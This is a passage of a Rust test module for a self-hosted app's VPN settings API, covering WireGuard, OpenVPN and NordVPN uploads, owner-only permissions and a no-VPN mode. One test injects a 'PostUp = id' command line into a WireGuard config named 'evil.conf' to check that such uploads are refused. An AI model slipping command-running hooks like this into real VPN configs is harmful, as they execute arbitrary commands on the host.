        let mut events = state.events.subscribe();
        let app = crate::app::router(state);

        // Status needs a signed-in caller; members may read it.
        let (code, _) = call(
            &app,
            request(
                Method::GET,
                "/api/vpn/status",
                None,
                "application/json",
                Body::empty(),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::UNAUTHORIZED);
        let (code, body) = call(
            &app,
            request(
                Method::GET,
                "/api/vpn/status",
                Some(member()),
                "application/json",
                Body::empty(),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::OK);
        assert_eq!(body["state"], "unreachable");
        assert_eq!(body["configured"], false);

        // Members cannot change the VPN.
        let json = serde_json::json!({ "config": good_wireguard() }).to_string();
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/wireguard",
                Some(member()),
                "application/json",
                Body::from(json.clone()),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::FORBIDDEN, "{body}");
        assert!(!vpn.join(WIREGUARD_FILE).exists());

        // Owner: JSON WireGuard.
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/wireguard",
                Some(owner()),
                "application/json",
                Body::from(json),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::OK, "{body}");
        assert_eq!(body["configured"], true);
        assert_eq!(body["provider"], "wireguard");
        assert_eq!(body["label"], "WireGuard · nl-12.vpn.example.com");
        assert_eq!(mode(&vpn.join(WIREGUARD_FILE)), 0o600);
        // Every open page hears about it, even with no status watcher running.
        match events.try_recv() {
            Ok(stash_core::events::Event::Vpn(status)) => assert!(status.configured),
            other => panic!("expected a vpn event, got {other:?}"),
        }

        // Owner: multipart WireGuard with a malicious line is refused with a sentence.
        let bad = good_wireguard().replace("DNS = 10.2.0.1", "DNS = 10.2.0.1\nPostUp = id");
        let (ct, body) = multipart(&[("file", Some("evil.conf"), &bad)]);
        let (code, body) = call(
            &app,
            request(Method::POST, "/api/vpn/wireguard", Some(owner()), &ct, body),
        )
        .await;
        assert_eq!(code, StatusCode::BAD_REQUEST);
        assert_eq!(body["error"]["code"], "bad_request");
        assert!(
            body["error"]["message"]
                .as_str()
                .unwrap()
                .contains("runs commands")
        );

        // Owner: multipart OpenVPN with credentials.
        let (ct, body) = multipart(&[
            ("file", Some("home.ovpn"), &generic_ovpn()),
            ("username", None, "me"),
            ("password", None, "pw"),
        ]);
        let (code, body) = call(
            &app,
            request(Method::POST, "/api/vpn/openvpn", Some(owner()), &ct, body),
        )
        .await;
        assert_eq!(code, StatusCode::OK, "{body}");
        assert_eq!(body["protocol"], "openvpn");
        assert_eq!(body["label"], "OpenVPN · home");
        assert_eq!(
            std::fs::read_to_string(vpn.join(OPENVPN_AUTH_FILE)).unwrap(),
            "me\npw\n"
        );
        assert!(!vpn.join(WIREGUARD_FILE).exists());

        // Missing password.
        let (ct, body) = multipart(&[
            ("file", Some("home.ovpn"), &generic_ovpn()),
            ("username", None, "me"),
        ]);
        let (code, _) = call(
            &app,
            request(Method::POST, "/api/vpn/openvpn", Some(owner()), &ct, body),
        )
        .await;
        assert_eq!(code, StatusCode::BAD_REQUEST);

        // Torrents are off in tests: reconnect says so.
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/reconnect",
                Some(owner()),
                "application/json",
                Body::empty(),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::SERVICE_UNAVAILABLE);
        assert_eq!(body["error"]["code"], "vpn_unavailable");

        // Remove.
        let (code, body) = call(
            &app,
            request(
                Method::DELETE,
                "/api/vpn",
                Some(owner()),
                "application/json",
                Body::empty(),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::OK, "{body}");
        assert_eq!(body["configured"], false);
        assert_eq!(body["state"], "unreachable");
        assert!(!vpn.join(OPENVPN_FILE).exists() && !vpn.join(VPN_META_FILE).exists());

        // NordVPN body errors are plain sentences without echoing input.
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/nordvpn",
                Some(owner()),
                "application/json",
                Body::from("{\"access_token\": 5}"),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::BAD_REQUEST);
        assert!(
            body["error"]["message"]
                .as_str()
                .unwrap()
                .starts_with("Send the NordVPN access token")
        );
    }

    /// With STASH_ALLOW_NO_VPN the supervisor never applies a VPN and the VPN page hides
    /// the setup forms, so the API refuses to save one (409, with the way back) instead of
    /// keeping a VPN nobody uses. Removing a saved VPN still works.
    #[tokio::test]
    async fn saving_a_vpn_is_refused_while_torrents_skip_the_vpn() {
        let dir = tempfile::tempdir().unwrap();
        let stash = dir.path().join("stash");
        std::fs::create_dir_all(&stash).unwrap();
        let mut config = Config::for_tests(&stash, &dir.path().join("config"));
        // The engine is not answering (restarting); the supervisor's fresh status file says
        // the kill switch is off, which only STASH_ALLOW_NO_VPN does.
        let port = {
            let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
            listener.local_addr().unwrap().port()
        };
        config.torrentd_url = Some(Url::parse(&format!("http://127.0.0.1:{port}")).unwrap());
        config.internal_token = Some("internal-token".into());
        let run_dir = dir.path().join("run");
        std::fs::create_dir_all(&run_dir).unwrap();
        config.supervisor_socket = Some(run_dir.join("supervisor.sock"));
        let tunnel = stash_core::internal_api::TunnelStatus {
            kill_switch: false,
            ..stash_core::internal_api::TunnelStatus::not_configured(stash_core::now())
        };
        std::fs::write(
            run_dir.join(stash_core::internal_api::STATUS_FILE),
            serde_json::to_vec(&tunnel).unwrap(),
        )
        .unwrap();
        let state = crate::app::build_state(config).await.unwrap();
        let vpn = state.config.vpn_dir();
        // A VPN saved before the variable was set.
        apply_wireguard(&state.config, &good_wireguard(), Some("home.conf"))
            .await
            .unwrap();
        let saved = std::fs::read(vpn.join(WIREGUARD_FILE)).unwrap();
        let app = crate::app::router(state);

        let refused = |code: StatusCode, body: &serde_json::Value| {
            assert_eq!(code, StatusCode::CONFLICT, "{body}");
            assert_eq!(body["error"]["code"], "conflict");
            assert_eq!(body["error"]["message"], MSG_NO_VPN_MODE);
        };
        let json = serde_json::json!({ "config": good_wireguard() }).to_string();
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/wireguard",
                Some(owner()),
                "application/json",
                Body::from(json.clone()),
            ),
        )
        .await;
        refused(code, &body);
        let (ct, body) = multipart(&[
            ("file", Some("home.ovpn"), &generic_ovpn()),
            ("username", None, "me"),
            ("password", None, "pw"),
        ]);
        let (code, body) = call(
            &app,
            request(Method::POST, "/api/vpn/openvpn", Some(owner()), &ct, body),
        )
        .await;
        refused(code, &body);
        let token = serde_json::json!({ "access_token": "a-token", "protocol": "wireguard" });
        let (code, body) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/nordvpn",
                Some(owner()),
                "application/json",
                Body::from(token.to_string()),
            ),
        )
        .await;
        refused(code, &body);
        // Nothing was written over the saved VPN.
        assert_eq!(std::fs::read(vpn.join(WIREGUARD_FILE)).unwrap(), saved);
        assert!(!vpn.join(OPENVPN_FILE).exists());
        // Members still get the plain "owners only" answer.
        let (code, _) = call(
            &app,
            request(
                Method::POST,
                "/api/vpn/wireguard",
                Some(member()),
                "application/json",
                Body::from(json),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::FORBIDDEN);

        // Removing the unused VPN is allowed.
        let (code, body) = call(
            &app,
            request(
                Method::DELETE,
                "/api/vpn",
                Some(owner()),
                "application/json",
                Body::empty(),
            ),
        )
        .await;
        assert_eq!(code, StatusCode::OK, "{body}");
        assert_eq!(body["configured"], false);
        assert_eq!(body["allow_no_vpn"], true);
        assert!(!vpn.join(WIREGUARD_FILE).exists() && !vpn.join(VPN_META_FILE).exists());
    }
}
